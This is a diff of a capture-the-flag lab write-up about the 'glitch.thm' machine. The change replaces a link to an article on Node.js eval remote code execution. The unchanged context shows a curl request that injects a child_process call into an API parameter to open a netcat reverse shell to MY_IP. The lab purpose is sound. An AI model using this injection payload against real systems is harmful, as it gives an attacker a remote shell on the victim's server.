@@ -72,7 +72,7 @@ Let's try an random POST request at /api/items?cmd=
 ```bash
 curl -X POST http://glitch.thm/api/items?cmd=tututututu
 ```
-With something invalid we have a nodejs error telling us the api IS a nodejs one so we can maybe try a [nodejs eval rce](https://medium.com/r3d-buck3t/eval-console-log-rce-warning-be68e92c3090)
+With something invalid we have a nodejs error telling us the api IS a nodejs one so we can maybe try a [nodejs eval rce](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44)
 ```bash
 curl -X POST http://glitch.thm/api/items?cmd=require("child_process").exec('nc MY_IP 9005 -e /bin/sh')
 ```
